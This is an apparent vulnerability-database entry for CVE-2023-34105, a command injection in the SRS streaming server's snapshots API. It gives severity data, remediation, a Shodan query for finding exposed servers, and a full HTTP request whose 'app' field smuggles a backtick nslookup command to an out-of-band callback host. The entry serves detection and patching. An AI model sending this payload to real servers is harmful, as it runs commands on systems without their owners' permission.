---
layout: "post"
cve_id: "CVE-2023-34105"
title: "SRS - Command Injection"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-34105.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-34105.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "high"
impact: "Unauthenticated attackers with user interaction can inject commands through the app parameter in the snapshots API to execute arbitrary commands on the SRS streaming server.
"
remediation: "Update SRS (Simple Realtime Server) to a version newer than v5.0.156 or v6.0.47 that properly sanitizes input in the api-server snapshots endpoint.
"
reference:
  - "https://github.com/ossrs/srs/security/advisories/GHSA-vpr5-779c-cx62"
  - "https://github.com/ossrs/srs/blob/1d11d02e4b82fc3f37e4b048cff483b1581482c1/trunk/research/api-server/server.go#L761"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H', 'cvss-score': 7.5, 'cve-id': 'CVE-2023-34105', 'cwe-id': 'CWE-77,CWE-78', 'epss-score': 0.82764, 'epss-percentile': 0.99214, 'cpe': 'cpe:2.3:a:ossrs:simple_realtime_server:*:*:*:*:*:*:*:*'}"
metadata: "{'vendor': 'ossrs', 'product': 'simple_realtime_server', 'shodan-query': 'http.favicon.hash:1386054408', 'verified': True, 'max-request': 1}"
tags:
  - "cve"
  - "cve2023"
  - "srs"
  - "rce"
  - "oast"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
SRS's v5.0.137~v5.0.156, v6.0.18~v6.0.47 api-server server is vulnerable to a drive-by command injection.


## üåê HTTP Request
```nohighlight
POST /api/v1/snapshots HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Connection: close
Content-Length: 141
Content-Type: application/json
Accept-Encoding: gzip

{"action":  "on_publish", "app":  "`nslookup d5iregple0o2lt6r7sc04ritwapdnzdfw.oast.pro`", "stream":"foo", "vhost": "foo", "client_id":"foo"}
```

